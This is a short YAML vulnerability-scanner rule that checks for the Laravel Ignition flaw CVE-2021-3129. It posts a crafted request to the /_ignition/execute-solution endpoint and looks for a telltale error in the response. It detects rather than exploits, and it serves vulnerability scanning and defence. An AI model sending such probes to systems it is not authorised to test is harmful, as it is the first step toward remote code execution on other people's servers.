name: poc-yaml-laravel-cve-2021-3129
set:
  random: randomLowercase(12)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /_ignition/execute-solution
      headers:
        Content-Type: application/json
      body: |-
        {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                  "variableName": "username",
                  "viewFile": "{{random}}"
                }
        }
      follow_redirects: true
    expression: >
      response.status == 500 && response.body.bcontains(bytes("file_get_contents(" + string(random) + ")")) && response.body.bcontains(bytes("failed to open stream"))
expression: r0()
detail:
  links:
    - https://github.com/vulhub/vulhub/blob/master/laravel/CVE-2021-3129
